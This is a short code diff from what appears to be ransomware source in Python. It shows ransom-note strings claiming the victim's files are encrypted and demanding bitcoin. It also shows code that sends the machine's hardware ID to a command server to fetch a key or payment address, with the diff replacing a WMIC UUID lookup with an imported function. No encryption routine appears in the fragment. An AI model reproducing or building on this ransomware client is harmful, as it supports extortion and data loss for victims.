@@ -1,24 +1,15 @@
 import qrc
 import requests as req
 from  window  import Window
-import subprocess
-
+from windows import getHwid
 textOne = ":("
 textTwo = "Looks like your files have been encrypted"
 textThree= "Send 0.005 bitcoin to this adress to free your files : "
 
 
 
-def get_uuid():
-    cmd = "wmic csproduct get uuid"
 
-    uuid = str(subprocess.check_output(cmd))
-    pos1= uuid.find("\\n")+2
-    uuid = uuid[pos1:-15]
-    return '{' + str(uuid) + '}'
-
-
-address = req.post("localhost/index.php?action=getPublicKey", data={"uuid": get_uuid()}).text
+address = req.post("http://localhost/server/hdhohzuag.php?action=getPublicKey", data={"uuid": getHwid()}).text
 
 qrc = qrc.QRC(address)
 
